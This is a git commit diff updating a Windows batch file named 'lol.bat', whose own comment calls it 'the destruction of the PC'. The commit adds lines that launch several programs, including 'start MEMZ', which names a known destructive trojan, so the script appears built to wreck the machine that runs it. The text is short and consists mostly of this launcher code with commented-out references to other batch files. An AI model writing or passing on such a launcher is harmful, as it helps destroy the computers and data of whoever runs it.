9bc0ff2891a3425dcead733c03f71e7fb7b9ee4c
SH0-ahacker <52937131+SH0-ahacker@users.noreply.github.com>
2019-07-16 21:05:17 -0300

    Update lol.bat

--- lol.bat
+++ lol.bat
@@ -43,3 +43,10 @@ cls
 # start "PLOS1.zip"
 //NOTE:"lol.bat" = "the destruction of the"PC"!"
 # start "START_GOOGLE.bat"
+# start "PLOS1.bat"
+start a
+start b
+start c
+start MEMZ
+# start "PLOS1.bat"
+# start "loading.bat"
